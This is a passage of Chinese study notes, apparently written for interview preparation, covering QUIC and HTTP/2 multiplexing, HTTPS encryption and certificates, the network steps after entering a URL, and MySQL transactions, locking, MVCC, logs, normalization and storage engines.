HTTP2.0中的二进制分帧传输解决了HTTP1.1中的队首阻塞问题，但是HTTP2.0是基于TCP协议的，TCP协议在处理包时是有严格顺序的，当其中一个数据包出现问题，TCP连接需要等待这个包完成重传之后才能继续进行，虽然HTTP2.0通过多个流，使得逻辑上一个TCP连接实现并行进行多路数据的传输，然后这中间没有关联的数据，当前面流的帧没有收到，后面流的帧也会因此堵塞。

同HTTP2.0一样，同一条QUIC连接上可以创建多个stream，来发送多个http请求，但是QUIC是基于UDP的，一个连接上的多个流之间没有依赖，这样假如前面的流丢失了一个UDP包，后面流的包不会因此堵塞可以继续发送。

#### 自定义流量控制

TCP流量控制通过滑动窗口实现。QUIC的流量控制也是如此，但是QUIC窗口是适应自己的多路复用机制的，不但在一个连接上控制窗口，还在一个连接上的每个流控制窗口。

## HTTPS

HTTP有以下安全性问题：

- 使用明文进行通信，内容可能被窃听；
- 不验证通信方的身份，通信方的身份有可能遭遇伪装；
- 无法证明报文的完整性，报文有可能遭篡改

HTTPS 并不是新协议，而是让 `HTTP `先和 `SSL（Secure Sockets Layer）`通信，再由 SSL 和 TCP 通信，也就是说 HTTPS 使用了隧道进行通信。

通过使用 SSL，HTTPS 具有了**加密（防窃听）**、**认证（防伪装）**和**完整性保护（防篡改）**。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\ssl-offloading.png" alt="img" style="zoom:60%;" />
</div>


### 加密

#### 对称密钥加密

对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。

- 优点：运算速度快；
- 缺点：无法安全地将密钥传输给通信方。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\samekey.png" alt="img" style="zoom:60%;" />
</div>


#### 非对称密钥加密

非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。

公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。

非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。

- 优点：可以更安全地将公开密钥传输给通信发送方；
- 缺点：运算速度慢。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\publickey.png" alt="img" style="zoom:60%;" />
</div>


### HTTPS采用的加密方式

上面提到对称密钥加密方式的传输效率更高，但是无法安全地将密钥 Secret Key 传输给通信方。而非对称密钥加密方式可以保证传输的安全性，因此我们可以利用非对称密钥加密方式将 Secret Key 传输给通信方。HTTPS 采用混合的加密机制，正是利用了上面提到的方案：

- 使用非对称密钥加密方式，传输对称密钥加密方式所需要的 Secret Key，从而保证安全性;
- 获取到 Secret Key 后，再使用对称密钥加密方式进行通信，从而保证效率。（下图中的 Session Key 就是 Secret Key）
- 具体流程为：
  - 客户端请求建立HTTPS连接
  - 服务端向客户端发送`Public Key`（公钥）
  - 客户端生成`session key`（会话密钥），并使用`public key`对`session key`进行加密
  - 将加密之后的`session key`发送给服务端
  - 服务端使用`private key`（私钥）对加密后的`session key`进行解密
  - 双方使用`session key`进行加密传输

### 认证

通过使用 **证书** 来对通信方进行认证。

数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。

服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。

进行 HTTPS 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\ca.png" alt="img" style="zoom:80%;" />
</div>


### 完整性保护

SSL 提供报文摘要功能来进行完整性保护。

HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。

HTTPS 的报文摘要功能之所以安全，是因为它**结合了加密和认证**这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。

### HTTPS的缺点

- 因为需要加密解密等过程，因此速度很慢
- 需要支付证书授权的高额费用

## 输入一个URL之后发生了什么？

#### 简单版

1、首先，在浏览器地址栏中输入url，先解析url，检测url地址是否合法

2、浏览器先查看浏览器缓存-系统缓存-路由器缓存，如果缓存中有，会直接在屏幕中显示页面内容。若没有，则跳到第三步操作。

​		浏览器缓存：浏览器会记录DNS一段时间，因此，只是第一个地方解析DNS请求；

​		操作系统缓存：如果在浏览器缓存中不包含这个记录，则会使系统调用操作系统，获取操作系统的记录(保存最近的DNS查询缓存)；

​		路由器缓存：如果上述两个步骤均不能成功获取DNS记录，继续搜索路由器缓存；

​		ISP缓存：若上述均失败，继续向ISP搜索。

3、在发送http请求前，需要域名解析(DNS解析)，解析获取相应的IP地址。

4、浏览器向服务器发起tcp连接，与浏览器建立tcp三次握手。

5、握手成功后，浏览器向服务器发送http请求，请求数据包。

6、服务器处理收到的请求，将数据返回至浏览器

7、浏览器收到HTTP响应

8、浏览器解码响应，如果响应可以缓存，则存入缓存。

9、 浏览器发送请求获取嵌入在HTML中的资源（html，css，javascript，图片，音乐······），对于未知类型，会弹出对话框。

10、 浏览器发送异步请求。

11、页面全部渲染结束。

### DHCP 配置主机信息

- 假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。
- 主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。
- 该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。
- 该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与交换机连接的所有设备。
- 连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。
- 该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。
- 主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。

### ARP 解析 MAC 地址

- 主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。
- 主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。
- 该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。
- 该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。
- DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。
- 主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。
- 网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。

### DNS 解析域名

- 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。
- 网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。
- 因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。
- 到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。
- 找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。

### HTTP 请求页面

- 有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。
- 在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。
- HTTP 服务器收到该报文段之后，生成 TCP SYN ACK 报文段，发回给主机。
- 连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。
- HTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。
- 浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。

# 计算机网络之常见面试题

## MTU和MSS

- `MTU: maximum transmission unit`，最大传输单元，由硬件规定，即物理接口（数据链路层）提供给上层最大一次传输数据的大小，比如以太网的MTU为1500字节
- `MSS: maximum segment size`，最大分节大小，为TCP数据包每次传输的最大数据分段大小，一般由发送端向对端TCP通知对端在每个分节中能发送的TCP数据。一般`MSS=MTU-IPv4Header(20Bytes)-TCPHeader(20Bytes)`

# 关系型数据库MySQL原理

## 事务

### 概念

事务指的是满足 `ACID` 特性的一组操作，可以通过 `Commit` 提交一个事务，也可以使用 `Rollback` 进行回滚。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-15\event.png" alt="img" style="zoom:50%;" />
</div>


### ACID

#### 原子性（Atomicity）

事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。

回滚可以用回滚日志（`Undo Log`）来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。

#### 一致性（Consistency）

数据库在事务执行前后都保持一致性（不是一样）状态。在一致性状态下，所有事务对同一个数据的读取结果都是相同的。（指一个系统从一个正确的状态，转移到另一个正确的状态，可以说C是目的，AID是手段）

#### 隔离性（Isolation）

一个事务所做的修改在最终提交以前，对其它事务是不可见的。通过锁来实现，当前数据库系统中都提供了一种粒度锁的策略，允许事务仅锁住实体对象的子集，以此来提高事务之间的并发度。

#### 持久性（Durability）

一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。

系统发生奔溃可以用重做日志（`Redo Log`）进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。

#### ACID的关系

- 只有满足一致性，事务的执行结果才是正确的。
- 在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。
- 在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。
- 事务满足持久化是为了能应对系统崩溃的情况。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-15\acid.png" alt="img" style="zoom:50%;" />
</div>


### AUTOCOMMIT

MySQL 默认采用自动提交模式。也就是说，如果不显式使用`START TRANSACTION`语句来开始一个事务，那么每个查询操作都会被当做一个事务并自动提交。

## 并发一致性问题

在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。

产生并发不一致性问题的主要原因是**破坏了事务的隔离性**，解决方法是**通过并发控制来保证隔离性**。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。

### 丢失修改

丢失修改指一个事务的更新操作被另外一个事务的**更新操作替换**。一般在现实生活中常会遇到。

例如：T1 和 T2 两个事务都对一个数据进行修改，T1 先修改并提交生效，T2 随后修改，T2 的修改覆盖了 T1 的修改。

### 读脏数据

读脏数据指在不同的事务下，当前事务可以读到另外事务**未提交的数据**。

例如：T1 修改一个数据但未提交，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。

### 不可重复读

不可重复读指在一个事务内**多次读取同一数据集合**。在这一事务还未结束前，另一事务也访问了该同一数据集合并做了修改，由于第二个事务的修改，第一次事务的两次读取的数据**可能不一致**。

例如：T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。

### 幻影读

幻读本质上也属于不可重复读的情况。

例如：T1 读取**某个范围的**数据，T2 在这个范围内**插入**新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。

## 封锁

### 封锁粒度

MySQL 中提供了两种封锁粒度：**行级锁以及表级锁**。

应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。

但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。

在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。

### 封锁类型

#### 读写锁

- 互斥锁（Exclusive）：简写为X锁，又称为写锁。
- 共享锁（Shared）：简写S锁，又称为读锁。

有以下两个规定：

- 一个事务对数据对象 A 加了 **X 锁**，就可以对 A 进行**读取和更新**。**加锁期间其它事务不能对 A 加任何锁。**
- 一个事务对数据对象 A 加了 **S 锁**，可以对 A 进行**读取操作**，但是**不能进行更新操作**。加锁期间其它事务**能对 A 加 S 锁，但是不能加 X 锁**。

#### 意向锁

使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。

在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。

意向锁在原来的 X/S 锁之上引入了 `IX/IS`，`IX/IS` 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：

- 一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁；
- 一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。

通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。

锁的兼容关系：

- 任意 IS/IX 锁之间都是兼容的，因为它们只表示想要对表加锁，而不是真正加锁；
- 这里兼容关系针对的是**表级锁**，而表级的 IX 锁和行级的 X 锁兼容，两个事务可以对两个数据行加 X 锁。（事务 T1 想要对数据行 R1 加 X 锁，事务 T2 想要对同一个表的数据行 R2 加 X 锁，两个事务都需要对该表加 IX 锁，但是 IX 锁是兼容的，并且 IX 锁与行级的 X 锁也是兼容的，因此两个事务都能加锁成功，对同一个表中的两个数据行做修改。）

#### 乐观锁

是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，就进行回滚，使用数据版本标识数据（时间戳，版本号）

#### 悲观锁

当要对数据库中的一条数据进行修改的时候，为了避免同时被其他人修改，最好的办法就是直接对该数据进行加锁以防止并发。这种借助数据库锁机制，在修改数据之前锁定，再修改的方式被称为悲观锁。之所以叫做悲观锁，是因为这是一种对数据的修改抱有悲观态度（也就是先取锁再访问）的并发控制方式。是一种排他锁。

### 封锁协议

#### 三级封锁协议

- 一级封锁协议（对应Read Uncommited）
  - **事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。**
  - 可以**解决丢失修改**的问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。
- 二级封锁协议（对应Read Commited）
  - 在一级的基础上，要求读取数据 A 时必须加 S 锁，**读取完马上释放** S 锁。
  - 可以**解决读脏数据**问题，因为如果一个事务在对数据 A 进行修改，根据 1一级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。

- 三级封锁协议（对应Reapetable Read）
  - 在一级的基础上，要求读取数据 A 时必须加 S 锁，直到**事务结束了才能释放** S 锁。
  - 可以**解决不可重复读**的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。
- 四级封锁协议（对应Serialization）
  - 四级封锁协议是对三级封锁协议的增强，直接对事务中所读取或者更改的数据所在的表**加表锁**，也就是说其他事务不能读写该表中的任何数据。

#### 两段锁协议

加锁和解锁分为**两个阶段**进行。

可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。串行执行的事务互不干扰，不会出现并发一致性问题。

事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。

```sql
lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)
```

但不是必要条件，例如以下操作不满足两段锁协议，但它还是可串行化调度。

```sql
lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)
```

### MySQL隐式和显式锁定

MySQL 的 `InnoDB` 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。

`InnoDB` 也可以使用特定的语句进行显示锁定：

```sql
SELECT ... LOCK In SHARE MODE;
SELECT ... FOR UPDATE;
```

## 隔离级别

### 未提交读（READ UNCOMMITED）

事务中的修改，即使没有提交，对其他事务也是可见的。

不可以解决任何并发一致性问题。

### 提交读（READ COMMITED）

一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。

可以解决脏读问题。不可以解决不可重复读，幻影读问题。

### 可重复读（REPEATABLE READ）

保证在同一个事务中多次读取同一数据的结果是一样的。

可以解决脏读和不可重复读问题。不可以解决幻影读问题。

### 可串行化（SERIALIZABLE）

强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。

该隔离级别需要加锁实现，因为要使用加锁机制保证同一时间只有一个事务执行，也就是保证事务串行执行。

## 多版本并发控制（MVCC）

多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的` InnoDB` 存储引擎实现隔离级别的一种具体方式，用于实现**提交读和可重复读**这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，要求很低，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。

### 基本思想

在封锁一节中提到，加锁能解决多个事务同时执行时出现的并发一致性问题。在实际场景中读操作往往多于写操作，因此又引入了读写锁来避免不必要的加锁操作，例如读和读没有互斥关系。读写锁中读和写操作仍然是互斥的，而 MVCC 利用了多版本的思想，写操作更新最新的**版本快照**，而读操作去读旧版本快照，没有互斥关系，这一点和` CopyOnWrite` 类似。

在 MVCC 中事务的修改操作（`DELETE、INSERT、UPDATE`）会为数据行新增一个版本快照。

脏读和不可重复读最根本的原因是事务读取到其它事务未提交的修改。在事务进行读取操作时，为了解决脏读和不可重复读问题，MVCC 规定只能读取已经提交的快照。当然一个事务可以读取自身未提交的快照，这不算是脏读。

### 版本号

- 系统版本号 `SYS_ID`：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。
- 事务版本号 `TRX_ID` ：事务开始时的系统版本号。

### undo log

MVCC 的多版本指的是**多个版本的快照**，快照存储在 Undo Log中，该日志通过**回滚指针 ROLL_PTR** 把一个数据行的所有快照连接起来。

如果用户执行的事务或者语句由于某种原因失败，或者用户使用一条`ROLLBACK`语句请求回滚，就可以利用Undo Log将数据回滚到修改之前的样子。

存放在数据库内部的一个特殊段undo段中，undo段位域共享表空间中。

undo是逻辑日志，因此只是将数据库逻辑的恢复到原来的样子，所有的修改都被逻辑性的取消了，但是数据结构和页本身在回滚之后可能大不相同。

逻辑性的取消是指对每个`INSERT`都完成一个`DELETE`，对每个`DELETE`都完成一个`INSERT`，对每个`UPDATE`都完成一个反向`UPDATE`。

undo log的产生会伴随着redo log的产生，这是因为undo log也需要持久性的保护。

### redo log

重做日志（redo log）用来实现事务**的持久性**，即事务ACID中的D。redo log是持久的。

记录的是**数据页的物理修改**，而不是某一行或者某几行的修改记录，它用来恢复提交后的物理数据页（恢复数据也，且只能恢复到最后一次提交的位置）

在事务的进行过程中，不断有重做日志条目被写入到重做日志文件中。

在数据库运行时不需要对redo log日志进行读取操作。

为了确保每次日志都写入重做日志文件，在每次将重做日志缓冲写入重做日志文件后，InnoDB存储引擎都需要调用一次fsync操作。

### binary log（二进制日志）

记录了对Mysql数据库执行更改的所有操作（逻辑日志），但是不包括SELECT和SHOW这类操作，因为这类操作并没有对数据本身修改。然而如果操作本身并没有导致数据库发生变化，那么该操作也会写入二进制文件。

主要的作用：

- **恢复**：某些数据的恢复需要二进制日志，比如在一个数据库全备文件恢复后，用户可以通过二进制日志进行point-in-time恢复
- **复制**：原理与恢复类似，通过复制和执行二进制日志使远程一台mysql数据库（slave）与一台mysql数据库（master）进行实时同步。
- **审计**：用户可以通过二进制日志中的信息来进行审计，判断是否有对数据库进行注入的攻击。

### redo log 和 binary log区别

- redo log是在Innodb存储引擎层产生的，而binary log是在mysql数据库的上层产生的，并且binary log不仅仅针对于innodb存储引擎。
- 记录的内容形式不同，redo log是物理格式日志，记录的是对于每个页的修改；binary log是一种逻辑日志，记录的是对应的sql语句。

- 记录的时间点不同，redo log在事务进行中不断的被写入，该日志并不是随着事务提交的顺序进行写入的；binary log只在事务提交完成后进行一次写入

### ReadView

MVCC维护了一个ReadView结构，主要包含了当前系统未提交的事务列表`TRX_IDs{TRX_ID_1,TRX_ID_2,...}`，还有该列表的最小值`TRX_ID_MIN`和最大值`TRX_ID_MAX`。

在进行SELECT操作时，根据数据行快照的 `TRX_ID` 与 `TRX_ID_MIN` 和 `TRX_ID_MAX` 之间的关系，从而判断数据行快照是否可以使用：

- `TRX_ID < TRX_ID_MIN`，表示该数据行快照时在当前所有未提交事务之前进行更改的，因此可以使用。
- `TRX_ID` > `TRX_ID_MAX`，表示该数据行快照是在事务启动之后被更改的，因此不可使用。
- `TRX_ID_MIN` <= `TRX_ID` <= `TRX_ID_MAX`，需要根据隔离级别再进行判断：
  - 提交读：如果 `TRX_ID` 在 `TRX_IDs` 列表中，表示该数据行快照对应的事务还未提交，则该快照不可使用。否则表示已经提交，可以使用。
  - 可重复读：都不可以使用。因为如果可以使用的话，那么其它事务也可以读到这个数据行快照并进行修改，那么当前事务再去读这个数据行得到的值就会发生改变，也就是出现了不可重复读问题。

在数据行快照不可使用的情况下，需要沿着 Undo Log 的回滚指针 ROLL_PTR 找到下一个快照，再进行上面的判断。

### 快照读和当前读

#### 快照读

MVCC 的 `SELECT` 操作是快照中的数据，不需要进行加锁操作。

#### 当前读

MVCC 其它会对数据库进行修改的操作（`INSERT、UPDATE、DELETE`）需要进行加锁操作，从而读取最新的数据。可以看到 MVCC 并不是完全不用加锁，而只是避免了 `SELECT` 的加锁操作。

在进行SELECT操作时，可以强制指定进行加锁操作。

```sql
SELECT * FROM table WHERE ? lock in share mode;
SELECT * FROM table WHERE ? for update;
```

## Next-Key Locks

Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。

MVCC 不能解决幻影读问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 `MVCC + Next-Key Locks` 可以解决幻读问题。

#### Record Locks

锁定一个记录上的索引，而不是记录本身。

如果表没有设置索引，InnoDB会自动在主键上创建隐藏的聚簇索引，因此Record Locks依然可以使用。

#### Gap Locks

锁定索引之间的间隙，但是不包括索引本身。

例如当一个事务执行以下语句，其他事务就不能在`t.c`中插入15。

```sql
SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATA;
```

#### Next-Key Locks

是Record Locks 和 Gap Locks的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙，他锁定一个**前开后闭**的区间。

## 关系型数据库设计理论

### 函数依赖

记 `A->B` 表示 A 函数决定 B，也可以说 B 函数依赖于 A。

如果 `{A1，A2，... ，An}` 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。

对于 `A->B`，如果能找到 A 的真子集 `A'`，使得 `A'-> B`，那么`A->B` 就是部分函数依赖，否则就是完全函数依赖。

对于 `A->B`，`B->C`，则 `A->C` 是一个传递函数依赖。

### 范式

#### 第一范式

数据库中的字段都是单一属性的，不可再分。这个单一属性可以是数据库中任何一种基本数据类型。比如一个字段是姓名（NAME），在国内的话通常理解都是姓名是一个不可再拆分的单位，这时候就符合第一范式；但是在国外的话还要分为FIRST NAME和LAST NAME，这时候姓名这个字段就是还可以拆分为更小的单位的字段，就不符合第一范式了。

#### 第二范式

在第一范式的基础上要求在数据库表中不存在**非关键字段对任一候选关键字段**的部分函数依赖。意思就是说在第二范式中组合主键（AB）里面的A或者B与其他字段不能存在组合重复。通常的做法是不用组合主键，添加一个编号列，作为单一主键即可满足第二范式。比如说有一个表是学生表，学生表中有一个值唯一的字段学号，那么学生表中的其他所有字段都可以根据这个学号字段去获取，依赖主键的意思也就是相关的意思，因为学号的值是唯一的，因此就不会造成存储的信息对不上的问题，即学生001的姓名不会存到学生002那里去。

#### 第三范式

在第二范式的基础上要求数据表中不存在非关键字段对任一候选关键字段的传递函数依赖。比如说有一个表是学生表，学生表中有学号，姓名等字段，那如果要把他的系编号，系主任，系主任也存到这个学生表中，那就会造成数据大量的冗余，一是这些信息在系信息表中已存在，二是系中有1000个学生的话这些信息就要存1000遍。因此第三范式的做法是在学生表中增加一个系编号的字段（外键），与系信息表做关联。

### 异常

以下的学生课程关系的函数依赖为 `{Sno, Cname} -> {Sname, Sdept, Mname, Grade}`，键码为 `{Sno, Cname}`。也就是说，确定学生和课程之后，就能确定其它信息。

| Sno  | Sname  | Sdept  | Mname  | Cname  | Grade |
| ---- | ------ | ------ | ------ | ------ | ----- |
| 1    | 学生-1 | 学院-1 | 院长-1 | 课程-1 | 90    |
| 2    | 学生-2 | 学院-2 | 院长-2 | 课程-2 | 80    |
| 2    | 学生-2 | 学院-2 | 院长-2 | 课程-1 | 100   |
| 3    | 学生-3 | 学院-2 | 院长-2 | 课程-2 | 95    |

不符合范式的关系，会产生很多异常，主要有以下四种异常：

- **冗余数据**：例如 `学生-2` 出现了两次。
- **修改异常**：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。
- **删除异常**：删除一个信息，那么也会丢失其它信息。例如删除了 `课程-1` 需要删除第一行和第三行，那么 `学生-1` 的信息就会丢失。
- **插入异常**：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。

### ER图

#### 基本元素

- 实体：客观存在并可以相互区别的事务。使用矩形表示
- 属性：实体所具有的某一特性，一个实体可以由若干个属性来刻画。使用椭圆形表示，并用无向边将其与相应的实体连接起来。
- 联系：即在信息世界中反映实体内部或者实体之间的联系。实体内部联系通常指组成实体的各属性之间的联系；实体之间的联系通常指不同实体集之间的联系。使用菱形表示，并用无向边分别于有关实体连接起来，同时在无向边上标记联系的类型，如一对一，一对多，多对多标记为`1:1 1:n m:n`。

## MySQL逻辑架构

- 第一层是服务器层，主要提供连接处理、授权认证、安全等功能。

- 第二层实现了Mysql核心服务功能，包括查询解析、分析、优化、缓存以及日期和时间等所有内置函数、所有跨存储引擎的功能都在这一层实现，例如存储过程、触发器、视图等

- 第三层是存储引擎层，存储引擎负责Mysql中数据的存储和提取。服务器通过api和存储引擎通信，这些接口屏蔽了不同存储引擎的差异，是的差异对于上层查询过程透明。除了会解析外键定义的innodb外，存储引擎不会解析sql，不同存储引擎之间也不会相互通信，只是简单响应上层服务器请求。

### 查询流程

- 客户端发送一条查询给服务器
- 服务器先检查查询缓存，如果命中了缓存则立刻返回存储在缓存中的结果，否则进入下一个阶段
- 服务器端进行SQL解析、预处理，再由优化器生成对应的执行计划
- MySQL根据优化器生成的计划，调用存储引擎的API来执行查询
- 将结果返回给客户端

## 数据库引擎

#### InnoDB

InnoDB 是 MySQL 的默认事务型引擎，用来处理大量短期事务。InnoDB 的性能和自动崩溃恢复特性使得它在非事务型存储需求中也很流行，除非有特别原因否则应该优先考虑 InnoDB。

InnoDB 的数据存储在表空间中，表空间由一系列数据文件组成。MySQL4.1 后 InnoDB 可以将每个表的数据和索引放在单独的文件中。

InnoDB 采用 MVCC 来支持高并发，并且实现了四个标准的隔离级别。其默认级别是 REPEATABLE READ，并通过间隙锁策略防止幻读，间隙锁使 InnoDB 不仅仅锁定查询涉及的行，还会对索引中的间隙进行锁定防止幻行的插入。

InnoDB 表是基于聚簇索引建立的，InnoDB 的索引结构和其他存储引擎有很大不同，聚簇索引对主键查询有很高的性能，不过它的二级索引中必须包含主键列，所以如果主键很大的话其他所有索引都会很大，因此如果表上索引较多的话主键应当尽可能小。

InnoDB 的存储格式是平台建立的，可以将数据和索引文件从一个平台复制到另一个平台。

InnoDB 内部做了很多优化，包括从磁盘读取数据时采用的可预测性预读，能够自动在内存中创建加速读操作的自适应哈希索引，以及能够加速插入操作的插入缓冲区等。

#### MyISAM

MySQL5.1及之前，MyISAM 是默认存储引擎，MyISAM 提供了大量的特性，包括全文索引、压缩、空间函数等，但不支持事务和行锁，最大的缺陷就是崩溃后无法安全恢复。对于只读的数据或者表比较小、可以忍受修复操作的情况仍然可以使用 MyISAM。

MyISAM 将表存储在数据文件和索引文件中，分别以 .MYD 和 .MYI 作为扩展名。MyISAM 表可以包含动态或者静态行，MySQL 会根据表的定义决定行格式。MyISAM 表可以存储的行记录数一般受限于可用磁盘空间或者操作系统中单个文件的最大尺寸。

MyISAM 对整张表进行加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但是在表有读取查询的同时，也支持并发往表中插入新的记录。

对于MyISAM 表，MySQL 可以手动或自动执行检查和修复操作，这里的修复和事务恢复以及崩溃恢复的概念不同。执行表的修复可能导致一些数据丢失，而且修复操作很慢。

